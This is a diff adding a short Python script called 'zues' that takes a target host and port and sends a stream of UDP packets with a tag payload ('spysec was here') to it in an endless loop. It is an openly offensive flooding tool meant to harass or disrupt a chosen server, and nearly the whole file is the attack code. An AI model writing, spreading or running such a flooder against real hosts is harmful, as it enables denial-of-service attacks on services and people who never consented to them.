@@ -1,0 +1,56 @@
+#!/usr/bin/python3
+import os
+import socket
+from colorama import Fore
+import sys
+import time
+import requests
+
+os.system('clear' if os.name == 'posix' else 'cls')
+
+def get_help():
+    help = Fore.YELLOW+"\n[!] ./zues -t example.com:443\n"+Fore.WHITE
+    print(help)
+
+if len(sys.argv) == 3:
+   pass
+else:
+   get_help()
+   exit(0)
+
+option = sys.argv[1]
+
+if option == '-t':
+   pass
+else:
+   get_help()
+   exit(0)
+
+try:
+    z_domain_ip = sys.argv[2].split(':')[0] # domain / ip
+    if z_domain_ip == "":
+       get_help()
+       exit(0)
+    z_port = int(sys.argv[2].split(':')[1]) # port
+    if z_port == "":
+       get_help()
+       exit(0)
+except IndexError:
+    get_help()
+    exit(0)
+
+def launch_zues():
+    payload = "User-Agent: spysec was here \r\n\r\n"
+    pkt = 0
+    while True:
+          create_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+          try:
+              create_socket.connect((z_domain_ip,z_port))
+              create_socket.send(payload.encode('ascii'))
+          except socket.gaierror as e:
+              print(Fore.YELLOW+"\n[!] Unable to establish connection to host: ", e, "\n"+Fore.WHITE)
+              exit(0)
+          pkt+=1
+          print(Fore.GREEN+f"Sent {pkt} Packet To Address {z_domain_ip}:{z_port}"+Fore.WHITE)
+          time.sleep(0.5)
+launch_zues()
